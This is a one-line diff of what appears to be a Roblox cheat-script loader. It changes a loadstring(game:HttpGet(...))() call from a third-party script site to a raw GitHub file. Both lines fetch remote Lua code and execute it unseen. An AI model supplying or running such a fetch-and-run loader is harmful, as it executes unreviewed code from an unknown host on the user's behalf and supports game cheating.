@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://robloxscriptbest.com/script/loader.php?script=chilliv5beta"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/napun87/stealanegg/refs/heads/main/4495189928596383.lua"))()
